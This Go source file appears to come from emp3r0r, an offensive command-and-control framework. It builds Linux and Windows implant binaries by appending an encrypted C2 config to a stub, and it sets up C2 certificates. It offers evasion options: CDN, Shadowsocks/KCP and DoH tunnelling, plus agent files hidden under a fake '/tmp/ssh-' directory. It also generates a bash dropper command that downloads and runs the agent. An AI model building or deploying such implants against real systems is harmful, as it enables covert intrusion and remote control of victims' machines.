package cc

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/bettercap/readline"
	"github.com/google/uuid"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

const (
	CACrtFile     = "ca-cert.pem"
	CAKeyFile     = "ca-key.pem"
	ServerCrtFile = "emp3r0r-cert.pem"
	ServerKeyFile = "emp3r0r-key.pem"
)

func GenAgent() {
	now := time.Now()
	stubFile := emp3r0r_data.Stub_Linux
	outfile := fmt.Sprintf("%s/agent_linux_%d-%d-%d_%d-%d-%d",
		EmpWorkSpace,
		now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())

	os_choice := CliAsk("Generate agent for (1) Linux, (2) Windows: ")
	is_win := os_choice == "2"
	is_linux := os_choice == "1"
	if is_linux {
		CliPrintInfo("You chose Linux")
	}
	if is_win {
		stubFile = emp3r0r_data.Stub_Windows
		outfile = fmt.Sprintf("%s/agent_windows_%d-%d-%d_%d-%d-%d.exe",
			EmpWorkSpace,
			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
		CliPrintInfo("You chose Windows")
	}

	if !util.IsFileExist(stubFile) {
		CliPrintError("%s not found, build it first", stubFile)
		return
	}

	// fill emp3r0r.json
	err := PromptForConfig(true)
	if err != nil {
		CliPrintError("Failed to configure agent: %v", err)
		return
	}

	// read file
	jsonBytes, err := ioutil.ReadFile(EmpConfigFile)
	if err != nil {
		CliPrintError("Parsing EmpConfigFile config file: %v", err)
		return
	}

	// encrypt
	key := tun.GenAESKey(string(emp3r0r_data.OneTimeMagicBytes))
	encryptedJSONBytes := tun.AESEncryptRaw(key, jsonBytes)
	if encryptedJSONBytes == nil {
		CliPrintError("Failed to encrypt %s with key %s", EmpConfigFile, key)
		return
	}

	// write
	toWrite, err := ioutil.ReadFile(stubFile)
	if err != nil {
		CliPrintError("Read stub: %v", err)
		return
	}
	sep := bytes.Repeat(emp3r0r_data.OneTimeMagicBytes, 3)

	// wrap the config data with magic string
	toWrite = append(toWrite, sep...)
	toWrite = append(toWrite, encryptedJSONBytes...)
	toWrite = append(toWrite, sep...)
	err = ioutil.WriteFile(outfile, toWrite, 0755)
	if err != nil {
		CliPrintError("Save agent binary %s: %v", outfile, err)
		return
	}

	// done
	CliPrintSuccess("Generated %s from %s and %s, you can run %s on arbitrary target",
		outfile, stubFile, EmpConfigFile, outfile)

	// pack it accordingly
	// currently only Linux is supported
	// if is_linux {
	// 	Packer(outfile)
	// }
}

// PackAgentBinary pack agent ELF binary with Packer()
func PackAgentBinary() {
	// completer
	compls := []readline.PrefixCompleterInterface{
		readline.PcItemDynamic(listLocalFiles("./"))}
	CliCompleter.SetChildren(compls)
	defer CliCompleter.SetChildren(CmdCompls)

	// ask
	answ := CliAsk("Path to agent binary: ")

	go func() {
		err := Packer(answ)
		if err != nil {
			CliPrintError("PackAgentBinary: %v", err)
		}
	}()
}

func UpgradeAgent() {
	if !util.IsFileExist(WWWRoot + "agent") {
		CliPrintError("Make sure %s/agent exists", WWWRoot)
		return
	}
	checksum := tun.SHA256SumFile(WWWRoot + "agent")
	SendCmdToCurrentTarget(fmt.Sprintf("%s %s", emp3r0r_data.C2CmdUpdateAgent, checksum), "")
}

// PromptForConfig prompt user for emp3r0r config, and write emp3r0r.json
// isAgent: whether we are building a agent binary
func PromptForConfig(isAgent bool) (err error) {
	// read existing config when possible
	var (
		jsonData   []byte
		config_map map[string]interface{}
	)
	if util.IsFileExist(EmpConfigFile) {
		CliPrintInfo("Reading config from existing %s", EmpConfigFile)
		jsonData, err = ioutil.ReadFile(EmpConfigFile)
		if err != nil {
			CliPrintWarning("failed to read %s: %v", EmpConfigFile, err)
		}
		// load to map
		err = json.Unmarshal(jsonData, &config_map)
		if err != nil {
			CliPrintWarning("Parsing existing %s: %v", EmpConfigFile, err)
		}
	}

	// read existing emp3r0r.json
	read_from_cached := func(config_key string, silently_use bool) (val interface{}, err error) {
		// ask
		exists := false
		val, exists = config_map[config_key]
		if !exists {
			err = fmt.Errorf("%s not found in JSON config", config_key)
			return
		}
		if silently_use {
			return
		}
		if CliYesNo(
			fmt.Sprintf("Use cached %s (%s)",
				strconv.Quote(config_key), val)) {
			CliPrintInfo("Using cached '%s' for %s", val, strconv.Quote(config_key))
			return
		}
		CliPrintInfo("You have chosen NO")
		return nil, nil
	}

	ask := func(prompt, config_key string) (answer interface{}) {
		val, err := read_from_cached(config_key, false)
		if err != nil {
			CliPrintInfo("Read from cached %s: %v", EmpConfigFile, err)
		} else if val != nil {
			answer = val
			return
		}

		// ask
		return CliAsk(fmt.Sprintf("%s (%s): ", prompt, config_key))
	}

	// ask a few questions
	// CC names and certs
	var ans string
	if !isAgent {
		ans = fmt.Sprintf("%v",
			ask("CC host(s), can be one or more IPs or domain names, separate with space\n", "cc_host"))
	} else {
		ans = fmt.Sprintf("%v",
			ask("CC host for agent to connect to, can be an IP or a domain name", "cc_host"))
	}
	cc_hosts := strings.Fields(ans)
	RuntimeConfig.CCHost = cc_hosts[0]
	existing_names := tun.NamesInCert(ServerCrtFile)
	exists := false
	for _, c2_name := range existing_names {
		if c2_name == RuntimeConfig.CCHost {
			exists = true
			break
		}
	}
	// if user is requesting a new server name, server cert needs to be re-generated
	if !exists {
		CliPrintWarning("Name '%s' is not covered by our server cert, re-generating",
			RuntimeConfig.CCHost)
		cc_hosts = append(cc_hosts, existing_names...) // append new name
		// remove old certs
		os.RemoveAll(ServerCrtFile)
		os.RemoveAll(ServerKeyFile)
		err = GenC2Certs(cc_hosts)
		if err != nil {
			return fmt.Errorf("GenAgent: failed to generate certs: %v", err)
		}
		CliPrintWarning("You will need to restart emp3r0r C2 server to apply name '%s'",
			RuntimeConfig.CCHost)
	}

	// if building CC, we can safely ignore varibles below
	if !isAgent {
		return
	}
	if CliYesNo("Enable CC indicator") {
		RuntimeConfig.CCIndicator = fmt.Sprintf("%v",
			ask("Indicator URL, eg. https://example.com/ws/indicator.txt", "cc_indicator"))
		RuntimeConfig.CCIndicatorText = fmt.Sprintf("%v",
			ask("Indicator text, eg. 'emp3r0r c2 is online'", "indicator_text"))
		CliMsg("Remember to put text %s in your indicator response",
			strconv.Quote(RuntimeConfig.CCIndicatorText))
	} else {
		RuntimeConfig.CCIndicator = ""
		RuntimeConfig.CCIndicatorText = ""
		RuntimeConfig.IndicatorWaitMax = 0
	}
	if CliYesNo("Enable CDN proxy") {
		RuntimeConfig.CDNProxy = fmt.Sprintf("%v",
			ask("CDN proxy, eg. wss://example.com/ws/path", "cdn_proxy"))
	} else {
		RuntimeConfig.CDNProxy = ""
	}
	if CliYesNo("Enable Shadowsocks proxy " +
		"(C2 traffic will be encapsulated in Shadowsocks)") {
		RuntimeConfig.UseShadowsocks = true
		if CliYesNo("Enable KCP " +
			"(Shadowsocks traffic will be converted to UDP and go through KCP tunnel)") {
			RuntimeConfig.UseKCP = true
		} else {
			RuntimeConfig.UseKCP = false
		}
		RuntimeConfig.UseShadowsocks = true
	} else {
		RuntimeConfig.UseShadowsocks = false
		RuntimeConfig.UseKCP = false
	}
	if CliYesNo("Enable agent proxy (for C2 transport)") {
		RuntimeConfig.AgentProxy = fmt.Sprintf("%v",
			ask("Agent proxy, eg. socks5://127.0.0.1:1080", "agent_proxy"))
	} else {
		RuntimeConfig.AgentProxy = ""
	}
	if CliYesNo("Enable DoH (DNS over HTTPS)") {
		RuntimeConfig.DoHServer = fmt.Sprintf("%v",
			ask("DoH server, eg. https://1.1.1.1/dns-query", "doh_server"))
	} else {
		RuntimeConfig.DoHServer = ""
	}
	if !CliYesNo("Enable autoproxy feature (will enable UDP broadcasting)") {
		RuntimeConfig.BroadcastIntervalMax = 0
	} else {
		RuntimeConfig.BroadcastIntervalMax = 120
	}

	// ask for URL to download/exec agent
	if CliYesNo("Generate bash dropper command?") {
		url := CliAsk("(HTTP) URL to download agent binary (or staged executables), eg. 'http://example.com/emp3r0r': ")
		dropper := bash_http_downloader(url)
		CliPrintInfo("Your dropper command is\n%s", dropper)
	}

	// save emp3r0r.json
	return save_config_json()
}

// GenC2Certs generate certificates for CA and emp3r0r C2 server
func GenC2Certs(hosts []string) (err error) {
	if !util.IsFileExist(CAKeyFile) || !util.IsFileExist(CACrtFile) {
		err = tun.GenCerts(nil, "", true)
		if err != nil {
			return fmt.Errorf("Generate CA: %v", err)
		}
	}
	if !util.IsFileExist(CAKeyFile) || !util.IsFileExist(CACrtFile) {
		return fmt.Errorf("%s or %s still not found", CAKeyFile, CACrtFile)
	}

	// generate server cert
	return tun.GenCerts(hosts, "emp3r0r", false)
}

func save_config_json() (err error) {
	err = loadCA()
	if err != nil {
		return fmt.Errorf("save_config_json: %v", err)
	}
	w_data, err := json.Marshal(RuntimeConfig)
	if err != nil {
		return fmt.Errorf("Saving %s: %v", EmpConfigFile, err)
	}
	return ioutil.WriteFile(EmpConfigFile, w_data, 0600)
}

func InitConfigFile(cc_host string) (err error) {
	// random ports
	RuntimeConfig.CCHost = cc_host
	RuntimeConfig.CCPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	RuntimeConfig.ProxyPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	RuntimeConfig.BroadcastPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	RuntimeConfig.SSHDPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	RuntimeConfig.ShadowsocksPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	RuntimeConfig.KCPPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	RuntimeConfig.Timeout = util.RandInt(10000, 20000)

	// random strings
	RuntimeConfig.AgentUUID = uuid.NewString()
	agent_root := util.RandStr(util.RandInt(6, 20))
	RuntimeConfig.AgentRoot = fmt.Sprintf("/tmp/ssh-%v", agent_root)
	utils_path := util.RandStr(util.RandInt(3, 20))
	RuntimeConfig.UtilsPath = fmt.Sprintf("%s/%v", RuntimeConfig.AgentRoot, utils_path)
	socket := util.RandStr(util.RandInt(3, 20))
	RuntimeConfig.SocketName = fmt.Sprintf("%s/%v", RuntimeConfig.AgentRoot, socket)
	pid_file := util.RandStr(util.RandInt(3, 20))
	RuntimeConfig.PIDFile = fmt.Sprintf("%s/%v", RuntimeConfig.AgentRoot, pid_file)
	RuntimeConfig.ShadowsocksPassword = util.RandStr(20)

	// time intervals
	RuntimeConfig.BroadcastIntervalMin = 30
	RuntimeConfig.BroadcastIntervalMax = 130
	RuntimeConfig.IndicatorWaitMin = 30
	RuntimeConfig.IndicatorWaitMax = 130

	return save_config_json()
}

func loadCA() error {
	// CA cert
	ca_data, err := ioutil.ReadFile(CACrtFile)
	if err != nil {
		return fmt.Errorf("failed to read CA cert: %v", err)
	}
	tun.CACrt = ca_data
	RuntimeConfig.CA = string(tun.CACrt)
	return nil
}
